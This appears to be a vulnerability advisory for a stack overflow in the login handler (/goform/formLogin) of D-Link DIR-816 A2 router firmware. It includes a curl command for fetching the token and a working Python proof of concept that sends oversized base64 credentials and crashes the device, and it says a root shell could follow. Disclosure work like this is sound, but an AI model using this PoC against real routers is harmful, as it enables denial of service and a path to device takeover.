# D-link DIR-816 A2_v1.10CNB04.img Stack overflow vulnerability

## Firmware information

- Manufacturer's address：https://www.dlink.com/

- Firmware download address ： http://tsd.dlink.com.tw/GPL.asp

## Affected version

![](https://github.com/z1r00/IOT_Vul/blob/main/dlink/dir816/img/vuln2.png)

The picture above shows the latest firmware for this version

## Vulnerability details

![](https://github.com/z1r00/IOT_Vul/blob/main/dlink/Dir816/formLogin/img/v1.png)

The vulnerability occurs in /goform/formLogin. After the username and password are decrypted by base64, they will be stored in the stack of the program without checking the size, resulting in a stack overflow vulnerability.

## Poc

The first thing you need to do is to get the tokenid

```
curl http://192.168.0.1/dir_login.asp | grep tokenid
```

Then run the following poc

```python
import requests
import base64

li = lambda x : print('\x1b[01;38;5;214m' + x + '\x1b[0m')
ll = lambda x : print('\x1b[01;38;5;1m' + x + '\x1b[0m')

tokenid = '1804289383'

url = 'http://192.168.0.1/goform/formLogin'

payload = base64.b64encode(b'a' * 1000)

data = {
    'tokenid' : tokenid,
    'username' : payload,
    'password' : payload
}
response = requests.post(url, data=data)
response.encoding="utf-8"
info = response.text
li(url)
print(info)
```

After sending the poc, the router will crash, and finally we can write the exp to get the root shell

